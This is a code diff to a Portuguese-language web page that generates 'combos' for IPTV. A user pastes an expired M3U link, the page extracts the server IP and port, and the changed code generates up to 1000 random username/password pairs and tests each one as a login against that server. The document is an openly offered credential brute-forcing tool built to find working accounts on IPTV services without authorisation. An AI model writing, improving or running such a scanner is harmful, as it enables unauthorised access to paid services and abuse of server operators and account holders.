@@ -2,7 +2,7 @@
 <html lang="pt-BR">
 <head>
   <meta charset="UTF-8">
-  <title>Gerador de Combos M3U - Auto Scanner</title>
+  <title>Gerador de Combos M3U - Aleatórios</title>
   <style>
     body {
       background-color: #121212;
@@ -11,7 +11,7 @@
       text-align: center;
       padding: 20px;
     }
-    input, button {
+    input, button, select {
       margin: 10px;
       padding: 10px;
       font-size: 16px;
@@ -30,9 +30,16 @@
   </style>
 </head>
 <body>
-  <h1>Gerador de Combos M3U</h1>
+  <h1>Gerador de Combos M3U - Aleatórios</h1>
   
   <input type="text" id="m3u" placeholder="Cole aqui seu link M3U vencido">
+  
+  <select id="quantidade">
+    <option value="100">100 Combos</option>
+    <option value="500">500 Combos</option>
+    <option value="1000">1000 Combos</option>
+  </select>
+  
   <button onclick="iniciar()">Iniciar Scan</button>
 
   <div id="resultado"></div>
@@ -43,13 +50,21 @@
     let ativos = [];
     let combos = [];
 
-    function gerarCombos(usuario, senha) {
+    function gerarRandomString(length) {
+      const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+      let result = '';
+      for (let i = 0; i < length; i++) {
+        result += chars.charAt(Math.floor(Math.random() * chars.length));
+      }
+      return result;
+    }
+
+    function gerarCombosAleatorios(qtd) {
       const combosGerados = [];
-      // Gerar combinações novas com base nas informações extraídas da lista M3U
-      for (let i = 0; i <= 10; i++) {
-        combosGerados.push({ user: usuario + i, pass: senha + i });
-        combosGerados.push({ user: usuario, pass: senha + i });
-        combosGerados.push({ user: usuario + i, pass: senha });
+      for (let i = 0; i < qtd; i++) {
+        const user = gerarRandomString(Math.floor(Math.random() * 5) + 6); // 6 a 10 caracteres
+        const pass = gerarRandomString(Math.floor(Math.random() * 5) + 6); // 6 a 10 caracteres
+        combosGerados.push({ user, pass });
       }
       return combosGerados;
     }
@@ -65,6 +80,7 @@
 
     async function iniciar() {
       const m3u = document.getElementById('m3u').value.trim();
+      const quantidade = parseInt(document.getElementById('quantidade').value);
       const resultadoDiv = document.getElementById('resultado');
       ativos = [];
 
@@ -82,16 +98,9 @@
 
       const { ip, porta } = extraido;
 
-      // Extraímos o login e senha do link M3U (podemos extrair com regex ou outra lógica)
-      const regexLoginSenha = /username=([^&]+)&password=([^&]+)/;
-      const matchLoginSenha = m3u.match(regexLoginSenha);
-      let usuario = matchLoginSenha ? matchLoginSenha[1] : 'usuario';
-      let senha = matchLoginSenha ? matchLoginSenha[2] : 'senha';
+      combos = gerarCombosAleatorios(quantidade);
 
-      // Gerar combinações baseadas nos dados extraídos
-      combos = gerarCombos(usuario, senha);
-
-      resultadoDiv.innerHTML = `[+] Gerando ${combos.length} combinações e testando...\nServidor: ${ip}:${porta}\n`;
+      resultadoDiv.innerHTML = `[+] Gerando ${combos.length} combinações aleatórias e testando...\nServidor: ${ip}:${porta}\n`;
 
       for (let combo of combos) {
         const status = await testarLogin(ip, porta, combo.user, combo.pass);
